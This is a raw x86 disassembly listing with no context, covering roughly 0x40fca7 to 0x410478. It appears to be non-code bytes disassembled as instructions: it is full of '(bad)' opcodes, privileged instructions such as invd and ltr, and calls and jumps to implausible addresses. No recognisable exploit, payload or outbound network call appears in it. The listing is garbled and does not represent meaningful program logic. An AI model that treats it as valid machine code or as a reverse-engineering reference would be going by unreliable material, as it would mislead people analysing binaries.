  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
